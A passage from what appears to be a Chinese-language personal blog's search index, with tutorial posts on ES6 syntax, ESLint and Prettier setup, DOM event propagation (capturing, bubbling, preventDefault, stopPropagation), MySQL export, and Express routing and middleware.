nestedObj = { age: 20 }const obj1 = { name: 'PeaNu', detail: nestedObj}// 把 obj1 拆開後// nestedObj 還是外面那個 nestedObjconst obj2 = { name: 'PeaNu', detail: nestedObj}console.log(obj1.detail === obj2.detail) // true 背後的原理以物件來說的話，其實是用 Object.assign 來實現的： 1234const obj = { a: 1 };// 複製 obj 的內容到 {} 裡面const copy = Object.assign({}, obj);console.log(copy); // { a: 1 } 換成 ES6 寫法就是： 1234const obj = { a: 1 };// 複製 obj 的內容到 {} 裡面const copy = {...obj};console.log(copy); // { a: 1 }","link":"/2021/12/24/es6-spread-operator/"},{"title":"ES6 的字串模板","text":"絕對值得用！ 我知道它的名字真的有點難理解Template literals 的翻譯是「模板字串」或「樣板字面值」，但簡單來說，它的意思是我們先透過「模板語法」把內容給寫好，接著在把樣板編譯成可以執行的程式碼。 也就是說你實際上是在用一個已經建立好規則的模板來寫東西，而不是 JS 本身支援這種寫法，所以才會叫做「模板」。 過去式以往在做字串處裡時總會碰到一些麻煩問題。 多行字串時很麻煩： 1234const string = '\\n' +'yoo' + '\\n' +'hello' + '\\n' + 'Peanu' 與變數做字串拼接時很麻煩： 123function greeting (name) { console.log('hello,' + name + ' ' + 'now is ' + new Date().toLocaleTimeString())} 現在式改用模板來寫多行字串： 12345const string = `yoohelloPeanu` 改用模板來做字串拼接： 1234function greeting (name) { console.log(`hello, ${name}. now is ${new Date().toLocaleTimeString()}`)}greeting('PeaNu') 用過就再也回不去了…٩(●ᴗ●)۶","link":"/2021/12/24/es6-template-literals/"},{"title":"ESlint - 配置一個 Airbnb 環境","text":"感覺有點晚才開始碰這玩意兒。 VS-Code請先安裝底下這兩個 Extension： Prettier ESLint Prettier 的用意是讓你可以直接在 VS-Code 上存檔後自動格式化（formatOnSave），ESLint 的用意是直接在背後做語法檢查並顯示在 VS-Code 上。 換句話說就是： 請 VS-Code 全部幫我自動執行，我不想要自己用 CLI 來跑 prettier 或 eslint lint 來做格式化或語法檢查。 關於 eslint.rc 懶人包 env：告訴 ESlint 目前的執行環境是什麼（才能判斷該環境有哪些全域變數） extends：人家寫好的 config，例如 airbnb plugin：為 ESLint 添加新的規則（但不包含怎麼設定這些規則） rules：用來撰寫自己想要 / 不想要的規則 parserOptions：設定語言規範 or 額外功能（例如 ES6、JSX），讓 ESlint 能看得懂 最常搞混的應該是 extends 和 plugin，所以這邊再強調一次： plugin 是拿來「添加規則」用的，但不包含「怎麼設定這些規則」。如果要設定就得透過 rules 去一個一個調整，不過這樣子實在有點麻煩，所以就有了 extends 這個東西，它的想法是直接把「別人寫好的 rules」套用進來。 需安裝的套件（devDependencies） eslint-config-airbnb：整個 airbnb 的組合包，裡面會包含多個 plugin 和一個 config prettier：core package eslint：core package eslint-plugin-prettier：添加 prettier 的規則 eslint-config-prettier：設定 prettier plugin 的 config 建立 Prettier config在根目錄建立 .prettierrc 並填入你想要的規則即可： 12345678{ \"singleQuote\": true, \"semi\": false, \"jsxSingleQuote\": false, \"printWidth\": 100, \"useTabs\": false, \"trailingComma\": \"none\"} 之所以要建立這個檔案是為了讓所有人的格式是一致的，在這裡建立的規則會直接覆寫每個人自己在 VS-Code 中的設定，所以任何人在這份專案底下跑 prettier 的結果都會是相同的，不用擔心設定不同的問題。 建立 Eslint config 方法一：自己建立 .eslintrc 檔案 方法二：先用 npm 安裝 global eslint，接著再用 eslint --init 來建立 這邊用方法二建立出來的檔案內容大概會是這樣： 1234567891011121314151617181920{ // 執行環境資訊： // 1. 瀏覽器 // 2. 使用 commonjs（模組規範） // 3. 使用 es2021（ECMAScript） \"env\": { \"browser\": true, \"commonjs\": true, \"es2021\": true }, // 使用 eslint:recommended 寫好的 rules \"extends\": \"eslint:recommended\", \"overrides\": [], // ESlint 該怎麼讀你的語言（請依照最新的 ECMAScript） \"parserOptions\": { \"ecmaVersion\": \"latest\" }, // 你想要調整的規則，可以設為 off、warn 和 error 等等 \"rules\": {}} 這邊先注意 extends 就好，其他先看註解理解個大概就好，能看到預設的 ESlint 會用 eslint:recommended 這套規則，例如：no-unused-vars。 但這邊我們想要改成 airbnb 寫好的規則，所以會修改成下面這樣： 123456789101112131415{ \"env\": { \"browser\": true, \"commonjs\": true, \"es2021\": true }, // 改成 airbnb 寫好的規則 // 完整的寫法是 eslint-config-airbnb，但 \"eslint-config\" 是命名慣例所以這邊可以省略。 \"extends\": \"airbnb\", \"overrides\": [], \"parserOptions\": { \"ecmaVersion\": \"latest\" }, \"rules\": {}} 這時候就可以看到多出了一些不同的 lint，像 import/no-unresolved，這邊注意到 lint 除了指出問題（no-unresolved）以外，還會標示出這個 rule 的來源是誰，這邊是斜線前面的 import，代表說這個規則是從 import 這個 plugin 來產生的。 附註：前面在安裝 eslint-config-airbnb 的時候會順便安裝的 plugin 包含： eslint-plugin-import eslint-plugin-react eslint-plugin-react-hooks eslint-plugin-jsx-a11y 這些都是 airbnb config 在撰寫規則時會用到的規則，所以他才會安裝這些 plugin，你也可以到 package.json 確認： 12345678910111213\"devDependencies\": { \"eslint\": \"^8.28.0\", \"eslint-config-airbnb\": \"^19.0.4\", \"eslint-config-node\": \"^4.1.0\", \"eslint-config-prettier\": \"^8.5.0\", \"eslint-plugin-import\": \"^2.26.0\", // &lt;- 這一個 \"eslint-plugin-jsx-a11y\": \"^6.6.1\", \"eslint-plugin-node\": \"^11.1.0\", \"eslint-plugin-prettier\": \"^4.2.1\", \"eslint-plugin-react\": \"^7.31.11\", \"eslint-plugin-react-hooks\": \"^4.6.0\", \"prettier\": \"^2.8.0\"} prettier 一跑下去滿江紅，怎麼辦？ 這是因為我們對 prettier 的設定可能會跟 airbnb 的風格有衝突，像是單雙引號、句尾分號等等之類的問題。 雖然我們可透過 rule 去對 airbnb 一個一個做調整，但更簡單的做法是「直接用 prettier config 去覆蓋掉 airbnb config」，所以只要把 extends 的部分修改成這樣就好： 123456789101112131415{ \"env\": { \"browser\": true, \"commonjs\": true, \"es2021\": true }, // 加上 prettier 的 config // 記得順序很重要，後面的會蓋掉前面的!!! \"extends\": [\"airbnb\", \"prettier\"], \"overrides\": [], \"parserOptions\": { \"ecmaVersion\": \"latest\" }, \"rules\": {}} 附註：這邊的原理是讓 prettier 的優先權 &gt; airbnb，而不是讓 prettier 依照 airbnb 的規則去排版。因此 prettier 跑完的結果其實還是會跟 airbnb 的規則有衝突，但因為我們有指定優先權的關係，ESlint 就會知道要遵循 prettier 的規則，不會再顯示錯誤訊息。 為什麼 prettier 的規則不會有提示？要記得，ESLint 本身是不包含 prettier 的各項規則的，如果我們想要添加新的規則到 ESLint 就得透過 plugin。 還記得前面我們有安裝 eslint-plugin-prettier 嗎？現在只需要把它加入到 .eslintrc 即可： 12345678910111213141516171819202122{ \"env\": { \"browser\": true, \"commonjs\": true, \"es2021\": true }, // 完整寫法是：eslint-config-airbnb, eslint-config-prettier \"extends\": [\"airbnb\", \"prettier\"], // 告訴 eslint 添加 prettier 的規則 \"plugins\": [\"prettier\"], \"overrides\": [], \"parserOptions\": { \"ecmaVersion\": \"latest\" }, \"rules\": { // 針對 prettier plugin 設置規則 // 若沒依照 .prettierrc 的規範就會顯示 warn 訊息 \"prettier/prettier\": \"warn\", \"no-unused-vars\": \"warn\", \"no-console\": \"off\" }} 除了這種寫法以外，你去看 官方文件 的話他會說也可以這樣寫： 1234567891011121314151617{ \"env\": { \"browser\": true, \"commonjs\": true, \"es2021\": true }, // 加了一個 extends \"extends\": [\"airbnb\", \"plugin:prettier/recommended\"], \"overrides\": [], \"parserOptions\": { \"ecmaVersion\": \"latest\" }, \"rules\": { \"no-unused-vars\": \"warn\", \"no-console\": \"off\" }} 這邊改成只寫了 extends 而不寫 plugins，而且名稱也跟以往的 convention 不太一樣是為什麼呢？想知道詳細的話可以參考 這篇文章，裡面解釋得蠻清楚的。 簡單來說的話就是在我們安裝 prettier-plugin 的時候它直接幫你寫了一份設定檔（可以用來 extends 的那個）。這份設定檔跟一般常見的設定檔不太一樣，原本的設定檔是只有幫你寫好 rules，而 plugin 的部分你要自己去指定。 但現在這份設定檔直接幫你包含 rules 和 plugins 的設定，所以你只需要用 extends 來套用這份設定檔，跟確定你有安裝這套 plugin 就好了。 額外補充：用 ESLint 的 autoFix 來取代 prettier為了避免 prettier 和 ESLint 衝突的問題，有些人會傾向這種想法 我直接用 ESlint 自動修復的功能來排版就好，幹嘛用 prettier？ 關於這點我個人還是傾向用 prettier 的方式來排版。雖然 ESlint 的自動修復確實很方便，但我認為這種方便可能會讓你忽略掉自己到底寫錯了什麼，會有點失去當初用 ESLint 的初衷。 想解決衝突的問題我建議還是用前面提到的 prettier-plugin 來處理會好一點，雖然說背後的原理是讓 prettier 直接覆蓋掉其他規則，但至少會覆蓋掉的規則都是跟程式碼品質比較無關（單雙引號之類的）的層面，我認為這對整體在用 ESLint 的效果會更好一點。 倘若真的碰到不想要用 prettier 的團隊的話，我的建議是到 VS-Code 添加這些設定就好，不需要直接把 prettier 移除或整個 disabled 掉： 12345678{ \"editor.codeActionsOnSave\": { \"source.fixAll.eslint\": true // 啟用 ESlint 的自動修復（排版） }, \"[javascript]\": { \"editor.formatOnSave\": false // 關掉 formatOnSave 的功能（僅限 JavaScript，如果是 react 可改成 javascriptreact） }} 這樣的好處是你只有把會跟 ESlint 衝突的語言給關掉 prettier 而已，但在其他跟 ESlint 無關的語言（例如 HTML、CSS）你還是可以繼續用 prettier。","link":"/2022/11/30/eslint-airbnb-concept/"},{"title":"在 Create React App 開啟 ESLint 的 propTypes 驗證","text":"還不錯的東西。 簡述想知道更詳細的介紹可以參考： React 官方文件 Create React App 官方文件 ESLint 除了檢驗基本的 JS 語法以外，還有一個功能是檢查 React 中的 propTypes。顧名思義是用來檢查「Props 種類」的一項功能。 這邊會介紹一下要怎麼在 Create React App 的環境中打開這個功能。 先在根目錄建一個 .eslintrc 檔案，然後寫以下的內容： 12345678{ // 繼承原本的設定（預設值） \"extends\": \"react-app\", // 要新增的 ESLint 規則 \"rules\": { \"react/prop-types\": \"warn\" }} 當設定為 warn 時，如果出現不合法的 code，ESLint 就會自動在 console 中印出 warning 訊息來提醒你。 （我預期會傳入 string 卻接收到 number） 添加 propTypes 的好處是別人要看 code 會比較方便，程式碼品質也會比較好，所以就試著遵守這些規則吧！ 只要是會接收 props 的 Component，都可以在最下面加上它接收的 type： 1234567891011121314// 引入的是大寫import PropTypes from 'prop-types'// propTypes 是小寫TodoItem.propTypes = { // 物件可以用 shape 來描述的更詳細 todo: PropTypes.shape({ id: PropTypes.number, content: PropTypes.string, isDone: PropTypes.bool }), handleRemoveTodo: PropTypes.func, handleToggleTodoState: PropTypes.func} 如果接受多個 type 的寫法： 1234567ErrorMessage.propTypes = { apiGetError: PropTypes.object, apiPostError: PropTypes.oneOfType([ PropTypes.string, PropTypes.object ]),};","link":"/2022/04/09/eslint-prop-types/"},{"title":"JS 中的 eval","text":"不知道該放哪，就開一篇來記吧。 簡述簡單來說 eval 就是把字串當成 JavaScript 來執行，所以： 1234console.log(eval('1+1')); // 2console.log(eval('2*2')); // 4console.log(eval('2*2 === 2*2')); // trueconsole.log(eval('[] === []')); // false 所以要做計算機的話就能用 eval 來偷吃步。 不過沒特別原因的話不建議用這個 function，畢竟 XSS 的風險很重 QQ","link":"/2022/02/27/eval-function/"},{"title":"萬事拜託你囉！Event-delegation 機制","text":"哭阿～又是我。 簡述delegation 的意思是「代理」。 這個機制是用來解決兩個問題： 每個元素都要設定監聽器不會太浪費資源嗎？ 動態產生的元素要怎麼監聽事件？ 第一個問題－浪費資源假設有 1000 個按鈕都要有點擊事件，那就要設定 1000 個 addEventListener： 123456789// 1000 個按鈕const buttons = document.querySelectorAll('.btn')// 幫所有按鈕加上監聽器for (let i=0; i&lt;buttons.length; i++) { buttons[i].addEventListener('click', function() { console.log('click') } )} 有沒有更好的做法？ 當然有，請你回想「事件傳遞機制」。 當我們點下按鈕時，事件會先從 window 一路向下傳遞到父層，再到按鈕（target），接著再一路往上傳回 window。 所以把監聽器掛在「按鈕的父層」上一樣可以觸發事件，因此「一個」addEventListener 就夠了。 HTML： 12345678&lt;div class=\"div\"&gt; &lt;button class=\"btn\" data-number=\"1\"&gt;button&lt;/button&gt; &lt;button class=\"btn\" data-number=\"2\"&gt;button&lt;/button&gt; &lt;button class=\"btn\" data-number=\"3\"&gt;button&lt;/button&gt; &lt;button class=\"btn\" data-number=\"4\"&gt;button&lt;/button&gt; &lt;button class=\"btn\" data-number=\"5\"&gt;button&lt;/button&gt; &lt;button class=\"btn\" data-number=\"6\"&gt;button&lt;/button&gt;&lt;/div&gt; 123456// 只要在 div 中點擊都會被觸發的監聽器document.querySelector('div').addEventListener('click', function(e) { // 印出按鈕的編號 console.log(e.target.getAttribute('data-number'))}) 第二個問題－動態新增的元素如果要讓動態新增的元素也監聽事件，就得在「新增的地方」加上 addEventListener。 HTML： 12345&lt;div class=\"div\"&gt; &lt;button class=\"add-btn\"&gt;add button&lt;/button&gt; &lt;button class=\"btn\" data-number=\"1\"&gt;button&lt;/button&gt; &lt;button class=\"btn\" data-number=\"2\"&gt;button&lt;/button&gt;&lt;/div&gt; JavaScript： 123456789101112131415161718192021222324// 父節點const parent = document.querySelector('div')// 目前有幾個按鈕let currentButtonsCount = 2 // 新增按鈕document.querySelector('.add-btn').addEventListener('click', function(e) { // 更新按鈕數量 currentButtonsCount++ // 建立新元素 const element = document.createElement('button') // 填入文字 element.innerText = 'button' // 加上 class element.classList.add('btn') // 加上編號 element.setAttribute('data-number', currentButtonsCount) // 加上監聽器 element.addEventListener('click', function(e) { console.log(e.target.getAttribute('data-number')) }) // 插入新元素 parent.appendChild(element) }) 如果沒有加上這一段： 123element.addEventListener('click', function(e) { console.log(e.target.getAttribute('data-number'))}) 動態新增的按鈕是不會有 click 效果的。 這樣子很麻煩，而且又會回到一開始講的問題（太浪費資源），所以一樣可以改用 delegation 機制。 先加上這段： 123456// 監聽 div 底下的所有按鈕document.querySelector('div').addEventListener('click', function(e) { // 印出按鈕的編號 console.log(e.target.getAttribute('data-number'))}) 在改一下新增按鈕的部分： 1234567891011121314151617181920// 父節點const parent = document.querySelector('div')// 目前有幾個按鈕let currentButtonsCount = 2 // 新增按鈕document.querySelector('.add-btn').addEventListener('click', function(e) { // 更新按鈕數量 currentButtonsCount++ // 建立新元素 const element = document.createElement('button') // 填入文字 element.innerText = 'button' // 加上 class element.classList.add('btn') // 加上編號 element.setAttribute('data-number', currentButtonsCount) // 插入新元素 parent.appendChild(element) }) 補充－讓 delegation 的元素監聽捕獲跟冒泡有差嗎？在沒有設定 e.stopPropagation 的情況下是沒差的，不過一樣會遵循「先捕獲，再冒泡」的原則： 12345678&lt;div class=\"div\"&gt; &lt;button class=\"add-btn\"&gt;add button&lt;/button&gt; &lt;button class=\"btn\" data-index=\"1\"&gt;button&lt;/button&gt; &lt;button class=\"btn\" data-index=\"2\"&gt;button&lt;/button&gt; &lt;button class=\"btn\" data-index=\"3\"&gt;button&lt;/button&gt; &lt;button class=\"btn\" data-index=\"4\"&gt;button&lt;/button&gt; &lt;button class=\"btn\" data-index=\"5\"&gt;button&lt;/button&gt;&lt;/div&gt; JavaScript： 123456789101112// 讓 div 監聽捕獲階段document.querySelector('div').addEventListener('click', function(e) { console.log('click capturing', e.target.getAttribute('data-index')) }, true)// 讓 div 監聽冒泡階段document.querySelector('div').addEventListener('click', function(e) { console.log('click bubbling', e.target.getAttribute('data-index')) }, false) 加上 e.stopPropagation，處於冒泡階段的監聽器就不會被觸發： 1234567891011121314// 讓 div 監聽捕獲階段document.querySelector('div').addEventListener('click', function(e) { console.log('click capturing', e.target.getAttribute('data-index')) // 阻止事件傳遞 e.stopPropagation() }, true)// 讓 div 監聽冒泡階段document.querySelector('div').addEventListener('click', function(e) { console.log('click bubbling', e.target.getAttribute('data-index')) }, false)","link":"/2022/01/19/event-delegation/"},{"title":"事件傳遞機制－捕獲與冒泡","text":"別人說不難，但我怎麼覺得有點難。 把不懂的地方寫下來提醒自己我會搞混的點應該是因為沒有搞清楚這件事：一個 addEventListender 只可以監聽「一個階段」 在預設的情況下 addEventListender 監聽的是「冒泡階段」，所以你絕對不會看到外面的元素比裡面的元素還要早被觸發，因為大家都是監聽冒泡階段。也就是說外面的元素一定要等到 Target Phase 結束之後，進到冒泡階段往上傳才會一個一個被觸發。 那你要怎麼讓外面的元素先被觸發？讓它監聽捕獲階段 大概簡單來說就是這樣子吧… 事件的傳遞流程事件的傳遞機制其實分成「冒泡」跟「捕獲」，參考這張圖： 意思是說，當你點下 &lt;td&gt; 時，事件會先從 window 一路傳下來，接著到了 &lt;td&gt; 後，在一路傳回去。 從 window 到 &lt;td&gt; 的這一段叫做「捕獲階段（Capture phase）」 在 &lt;td&gt; 到 window 的這一段叫做「冒泡階段（Bubbling Phase）」 至於「Target Phase」就是觸發事件的那個元素，因為它是目標，所以沒有分冒泡或捕獲 所以從上圖可以知道事件的傳遞機制是：先捕獲，在冒泡 我們可以來實作看看就知道了： 12345&lt;div class=\"outter\"&gt; &lt;div class=\"inner\"&gt; &lt;button class=\"btn\"&gt;btn&lt;/button&gt; &lt;/div&gt;&lt;/div&gt; 12345678910111213141516171819// 監聽捕獲階段function addEventCapturing(selector) { document.querySelector(selector) .addEventListener('click', function(e) { console.log(selector, '捕獲') }, true)}// 監聽冒泡階段function addEventBubbling(selector) { document.querySelector(selector) .addEventListener('click', function(e) { console.log(selector, '冒泡') }, false)}// 讓 outter 監聽捕獲階段// 預期順序： outter -&gt; btn -&gt; inneraddEventBubbling('.btn')addEventBubbling('.inner')addEventCapturing('.outter') 刻意設成這樣的用意是為了讓你理解，只要讓外面的元素監聽「捕獲」，它就可以比裡面早被觸發。 Output： 123.outter 捕獲.btn 冒泡.inner 冒泡 接著讓每個元素都同時監聽「捕獲」與「冒泡」階段： 12345678910111213141516function addEventBoth(selector) { // 設置監聽器（聽冒泡階段） document.querySelector(selector) .addEventListener('click', function() { console.log(selector, '冒泡') }, false) // 設置監聽器（聽捕獲階段） document.querySelector(selector) .addEventListener('click', function() { console.log(selector, '捕獲') }, true)}// 讓每個元素同時監聽兩個階段addEventBoth('.btn')addEventBoth('.inner')addEventBoth('.outter') Output： 123456.outter 捕獲.inner 捕獲.btn 捕獲.btn 冒泡.inner 冒泡.outter 冒泡 補充－在 Target Phase 中的捕獲與冒泡[FE102] 中提到，如果在 Target Phase 同時監聽捕獲與冒泡階段，這時候會根據 addEventListener 的「設定順序」來執行，因此照這個邏輯底下應該要輸出：冒泡 -&gt; 捕獲 12345678910111213141516function addEventBoth(selector) { // 設置監聽器（聽冒泡階段） document.querySelector(selector) .addEventListener('click', function() { console.log(selector, '冒泡') }, false) // 設置監聽器（聽捕獲階段） document.querySelector(selector) .addEventListener('click', function() { console.log(selector, '捕獲') }, true) }// 讓每個元素同時監聽兩個階段// 預期結果： .btn 冒泡 -&gt; .btn 捕獲addEventBoth('.btn') 但實測發現這部分似乎有被修正過，所以一樣會遵守「先捕獲，在冒泡」的這個原則： 12.btn 捕獲.btn 冒泡","link":"/2022/01/18/event-flow/"},{"title":"preventDefault 的小知識","text":"寫下來怕以後忘記。 提醒請先理解 事件傳遞機制－捕獲與冒泡，不然保證你看不懂。 簡述preventDefault 的作用是用來阻止元素的預設行為，但它有個特別的地方在於只要 call 了這個 function，這個效果就會按照「事件傳遞機制」來傳遞下去。 就是如果在 window 的「捕獲階段」呼叫 preventDefault，那下面的 &lt;div&gt; 跟 &lt;a&gt; 也會吃到效果。 備註： 我後來發現不管 window 是在「捕獲階段」或「冒泡階段」呼叫 preventDefault，&lt;div&gt; 跟 &lt;a&gt; 都一樣會被影響。所以正確來說應該是「只要在同一條鏈上」，這條鏈上的所有元素都會被阻止預設行為。 實例直接實做就比較好懂了： 123&lt;div&gt; &lt;a href=\"abc.com\"&gt;link&lt;/a&gt;&lt;/div&gt; 1234// 在 window 的捕獲階段呼叫 preventDefaultwindow.addEventListener('click', function(e) { e.preventDefault()}, true) 補充－傳遞沒有分階段把剛剛的例子改寫成這樣，效果是一樣的： 1234// 在 window 的冒泡階段呼叫 preventDefaultwindow.addEventListener('click', function(e) { e.preventDefault()}, false) 不管 window 是在「冒泡」或「捕獲」觸發 preventDefault，同一條事件鏈上的元素都會被影響。 只有 不在同個事件鏈上的元素 才不會被影響到，例如說： 1234&lt;div class=\"div\"&gt; &lt;a class=\"btn\" href=\"abc.com\"&gt;link&lt;/a&gt; &lt;a class=\"btn\" href=\"abc.com\"&gt;link&lt;/a&gt;&lt;/div&gt; JavaScript： 12345678910111213// 第一個按鈕document.querySelectorAll('.btn')[0] .addEventListener('click', function(e) { // 阻止預設行為 e.preventDefault() console.log('only I can stop!!!') }, false)// 第二個按鈕document.querySelectorAll('.btn')[1] .addEventListener('click', function(e) { alert('oh no~') }, false) 大概可以想成是這樣的關係：","link":"/2022/01/19/event-prevent-default-extension/"},{"title":"阻止預設行為 preventDefaut","text":"一定要知道的東西。 簡述有些 HTML 元素會自己的預設行為，例如說： &lt;form&gt; 按下 type=submit 的按鈕時會送出表單 &lt;a&gt; 按下時會自動跳轉到連結的位置 &lt;input&gt; 按下鍵盤會出現輸入的字 而 event.preventDefault 的作用就是用來阻止這些預設行為。 以表單來舉例HTML： 123456 &lt;form class=\"block\"&gt; name: &lt;input type=\"text\" name=\"username\"&gt; password: &lt;input type=\"password\" name=\"password1\"&gt; password again:&lt;input type=\"password\" name=\"password2\"&gt; &lt;button&gt;Submit&lt;/button&gt;&lt;/form&gt; JavaScript： 123456789101112// 按鈕const form = document.querySelector('form')// 監聽 submit 事件form.addEventListener('submit', function(e) { const pwd1 = document.querySelector('input[name=password1]') const pwd2 = document.querySelector('input[name=password2]') // 如果密碼不一致就不送出表單 if (pwd1.value !== pwd2.value) { alert('密碼不一致') return e.preventDefault() }}) 你也可以自己試看看其他的元素，像是不要讓 &lt;a&gt; 跳轉或是 &lt;input&gt; 沒辦法輸入內容。","link":"/2022/01/18/event-prevent-default/"},{"title":"阻止事件傳遞 stopPropagation","text":"別讓上面或下面的人知道！ 提醒看不懂就代表你一定沒搞清楚事件的「傳遞流程」，罰你回去再看一次：事件傳遞機制－捕獲與冒泡 阻止向上傳遞（不要讓它往上冒泡）以下分別示範，「阻止」與「不阻止」的差異。 HTML： 12345&lt;div class=\"outter\"&gt; &lt;div class=\"inner\"&gt; &lt;button class=\"btn\"&gt;btn&lt;/button&gt; &lt;/div&gt;&lt;/div&gt; 先示範第一種，在沒有阻止事件傳遞時應該是這樣子： 123456789101112// 監聽冒泡階段function addEventBubbling(selector) { document.querySelector(selector) .addEventListener('click', function(e) { console.log(selector, '冒泡') }, false)}// 全部都監聽冒泡階段 click 事件addEventBubbling('.outter')addEventBubbling('.inner')addEventBubbling('.btn') Output： 123.btn 冒泡.inner 冒泡.outter 冒泡 現在讓 .btn 再加上一個事件來「阻止事件傳遞」，結果就不一樣： 1234567891011121314151617// 監聽冒泡階段function addEventBubbling(selector) { document.querySelector(selector) .addEventListener('click', function(e) { console.log(selector, '冒泡') }, false)}// btn 額外設立一個阻止傳遞的事件document.querySelector('.btn') .addEventListener('click', function(e) { // 阻止事件傳遞 e.stopPropagation() }, false)addEventBubbling('.outter')addEventBubbling('.inner')addEventBubbling('.btn') 1.btn 冒泡 阻止向上傳遞（不要讓它往下捕獲）跟剛剛一樣，差別在於一個是在「冒泡階段」阻止，一個是在「捕獲階段」阻止。 先示範一個錯誤的範例： 12345678910// outter 監聽冒泡階段document.querySelector('.outter') .addEventListener('click', function(e) { // 阻止事件傳遞 e.stopPropagation() }, false)// 以下監聽冒泡階段addEventBubbling('.btn')addEventBubbling('.inner') 怎麼沒有用？因為你沒搞清楚順序。觸發的順序是： .btn -&gt; .inner -&gt; outter 所以在 .outter 阻止事件傳遞的時候 .btn 跟 .inner 早就已經被觸發完了。 正確的作法是讓 .outter 在「捕獲階段」就阻止事件傳遞： 12345678910// outter 監聽捕獲階段document.querySelector('.outter') .addEventListener('click', function(e) { // 阻止事件傳遞 e.stopPropagation() }, true)// 以下監聽冒泡階段addEventBubbling('.btn')addEventBubbling('.inner') 這時候不管怎麼點都不會觸發，因為 .outter 在「捕獲階段」就讓事件停止向下傳遞。 補充 stopImmediatePropagation首先要知道一個元素是可以設定多個 addEventListener 的。 假設有個元素同時綁了兩個監聽器（click）： clickA clickB 如果我想在 clickA 觸發時阻止事件傳遞到 clickB，這時候沒辦法用 stopPropagation 來阻止，因為這兩個事件都綁在同個元素（層級）上。 這時候得用 stopImmediatePropagation，在 clickA 觸發的時候執行，這樣 clickB 就不會被觸發了。 先示範 stopPropagation 的情況： 1234567891011121314151617function clickA(selector) { document.querySelector('.btn') .addEventListener('click', function(e) { console.log('clickA') // 在 A 阻止事件傳遞 e.stopPropagation() }, false)}function clickB(selector) { document.querySelector('.btn') .addEventListener('click', function(e) { console.log('clickB') }, false)}// 在 .btn 監聽兩個事件（冒泡階段）clickA('.btn')clickB('.btn') clickB 一樣會被觸發： 改用 stopImmediatePropagation： 1234567891011121314151617function clickA(selector) { document.querySelector('.btn') .addEventListener('click', function(e) { console.log('clickA') // 在 A 立即阻止事件傳遞 e.stopImmediatePropagation() }, false)}function clickB(selector) { document.querySelector('.btn') .addEventListener('click', function(e) { console.log('clickB') }, false)}// 在 .btn 監聽兩個事件（冒泡階段）clickA('.btn')clickB('.btn') 這時候 clickB 就不會被觸發了： 最後做幾個補充： 注意設定監聽器的順序 在一個元素上綁定多個事件時，會按照「綁定的順序」來觸發，以前面的例子來說就是： clickA -&gt; clickB 如果現在你把設定順序改成 clickB -&gt; clickA，這時候 stopImmediatePropagation 就沒有作用，因為在 stopImmediatePropagation 執行前 clickB 會在那已經先被觸發了。 注意監聽的是哪個階段 其實如果你把 clickA 改成監聽「捕獲階段」，那 stopPropagation 一樣可以阻止 clickB 被觸發，我想是因為「先捕獲，在冒泡」這個傳遞機制的關係。","link":"/2022/01/19/event-stop-propagation/"},{"title":"用 Workbench 輸出和輸入 MySQL 資料","text":"隨手記一下。 簡述這邊我懶得拍一堆圖片，所以只講流程，想看圖的話可以參考 這篇。 輸出流程 從工具列選 Server -&gt; Data Export，會自動彈出新視窗 把你想輸出的 Database 和 Table 勾起來 到下面的 Export Options 設定輸出方式和位置，Export to Dump Project Folder 和 Export to Self-Contained File 只差要「包在一起」還是「拆成一個一個」，這邊就看需求來選。 最後按下 Start Export 就好了 輸入流程 打開一個下 Query 的視窗 把輸出好的檔案內容全部貼進去 最後按下執行（閃電 icon） 重新整理看有沒有成功就 OK 了","link":"/2022/03/30/export-mysql-database-by-workbench/"},{"title":"MySQL 匯出資料庫的方式","text":"要注意一下。 簡述先點你要匯出的 database，然後按匯出： 要注意如果是匯出 database 的話，這一步一定要選「自訂」，然後把「加入 CREATE DATABASE / USE 指令」勾起來： 為什麼一定要勾？因為沒有勾的話在匯入時就沒有 CREATE DATABASE 指令能用，然後就會出錯了。 寫這篇主要是想提醒這點而已。至於匯入的話，就是先點「匯入」按鈕，在把檔案上傳而已，這邊就不貼了。","link":"/2022/03/08/export-mysql-database/"},{"title":"Express 和 Apache 的差別","text":"在學會之前還蠻好奇的。 簡述在 Apache 的流程是長這樣： 在 Express 的流程是長這樣： 首先最大的差別是 Express 具備「路由」的能力 12345app.get('/', ...)app.post('/', ...)app.delete('/', ...)app.patch('/', ...)... 而 PHP + Apache 的特性很明顯，就是預設只會由「檔案路徑」來回應 resposne。 123請求 http://localhost/hello.phpApache 叫 PHP 去執行 hello.phpApache 再把執行結果傳回去 簡單來說就是一種「檔案系統」的感覺，你到打開什麼檔案就回傳什麼。 但 Express 沒有這種東西，可以想成它本身就具備產生結果的能力，不用再透過「 PHP 執行檔案」。 總之，你不會在 Express 看到這種東西： 1234app.get('/hello.js', ...)app.post('/bye.js', ...)app.delete('/index.js', ...)app.patch('/about.js', ...) 我想要什麼路由直接寫就好，也不用再開一大堆檔案來處理每個 request，這就是 Express 的強大之處。 總結來說，Express 就是一個能根據「路徑」和「HTTP Method」決定要回傳什麼內容的 Server。 不過為什麼 Express 可以做到這件事？是因為有個叫做「Middleware」的東西，這個之後會在解釋。","link":"/2022/03/25/express-and-apache-difference/"},{"title":"認識 Express 中的 Middleware","text":"Express 的本體。 什麼是 Middleware先來看一張圖： 簡單來說，Middleware 就是收到 request 後要做什麼處理的 function。 所以你仔細看就會發現 Express 就是各種 Middleware 來組成的： 1234567891011121314151617181920212223242526272829303132/* app.use 代表一開始就會先執行的全域 Middleware： bodyParser: 解析 request body session: 建立 session 機制 connect-flash: 一閃而過的訊息*/app.use(express.urlencoded({ extended: true }));app.use(express.json());app.use(session({ secret: 'keyboard cat', resave: false, saveUninitialized: true,}))app.use(flash());// 自訂的 Middleware，用來儲存給 view 存取的變數app.use((req, res, next) =&gt; { res.locals.username = req.session.username; res.locals.errorMessage = req.flash('errorMessage'); next();})// 自訂的 Middleware，用來回到上一頁const toPreviousPage = (req, res) =&gt; { return res.redirect('back');}// 根據路由收到的 request，依序丟給 middleware1, middleware2... 來處理，以此類推app.get('/login', usersController.login);app.post('/login', usersController.handleLogin, toPreviousPage);app.get('/logout', usersController.logout);app.get('/register', usersController.register);app.post('/register', usersController.handleRegister, toPreviousPage); 只要是 Middleware 都會有三個參數：req、res 和 next 12345function middleware (req, res, next) { // 在這裡面就可以用 req, res 做任何事 // 接著再呼叫 next()，把控制權交給下個 middleware next()} 實際範例先來介紹 app.use，可以想成是「全域的 Middleware」，它會影響到所有路由： 123456app.use((req, res, next) =&gt; { console.log('now: ', new Date()); // 在 console 顯示目前時間 next(); // 交給下個 middleware，這邊的下一個是 todoController});app.get('/todos', todoController.getAll)app.get('/todos/:id', todoController.get) 所以只要不管我到 /todos 或 /todos/:id，console 